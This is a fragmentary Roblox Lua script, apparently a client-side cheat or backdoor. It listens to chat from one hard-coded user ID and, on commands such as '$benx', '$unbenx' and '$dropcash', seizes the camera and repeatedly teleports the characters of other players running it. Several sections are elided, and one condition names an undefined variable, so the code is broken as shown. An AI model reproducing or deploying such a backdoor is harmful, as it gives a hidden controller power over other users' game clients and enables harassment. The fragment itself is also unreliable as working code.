while true do 
	local p4_lua = game:GetService("Players"):GetPlayerByUserId(1456523092) --xxxlolaxlol
		if p4_lua then
		...
		p4_lua.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= p4_lua then
					...
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = p4_lua.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						...
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p4_lua.Character.HumanoidRootPart.CFrame + p4_lua.Character.HumanoidRootPart.CFrame.lookVector * 0.5
		...
		p4_lua.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= p4_lua then
					...
					wait(15)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(p4_lua.Character.UpperTorso.Position)
				end
			end
		...
		p4_lua.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= p4_lua2 then
